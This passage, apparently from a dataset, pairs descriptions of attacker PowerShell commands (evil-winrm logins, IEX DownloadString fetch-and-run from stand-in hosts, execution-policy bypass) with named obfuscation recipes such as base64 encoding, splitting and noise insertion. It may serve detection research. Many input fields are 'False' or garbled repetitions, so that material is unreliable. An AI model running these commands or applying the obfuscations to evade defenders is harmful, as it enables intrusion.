    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destAddress} -u ${Username} -p ${Password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Connect to a remote system using evil-winrm with specified destination address, username, and password.",
    "origin_cmd": "evil-winrm -i ${destination_address} -u ${user_name} -p ${password}"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using a dynamically constructed code block. (Sharing PowerShell from a remote URL).",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using a dynamically constructed code block. (Sharing PowerShell from a remote URL).",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using a dynamically constructed code block. (Sharing PowerShell from a remote URL).",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using a dynamically constructed code block. (Sharing PowerShell from a remote URL).",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using a dynamically constructed code block.",
    "origin_cmd": "$code = 'IEX (New-Object Net.WebClient).DownloadString(\"http://malicious-server.com/malicious-script.ps1\")';Invoke-Expression -Command $code"
  },
  {
    "input": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": See: Download an original PowerShell process to download and execute a script from a remote URL.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": ...: Start a new PowerShell process to download and execute a script from a remote URL: Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": See: Download an original PowerShell process to download and execute a script from a remote URL.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": ...: Start a new PowerShell process to download and execute a script from a remote URL: Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": See: Download an original PowerShell process to download and execute a script from a remote URL.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": ...: Start a new PowerShell process to download and execute a script from a remote URL: Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": See: Download an original PowerShell process to download and execute a script from a remote URL.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": ...: Start a new PowerShell process to download and execute a script from a remote URL: Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": ": Start a new PowerShell process to download and execute a script from a remote URL.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}\""
  },
  {
    "input": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
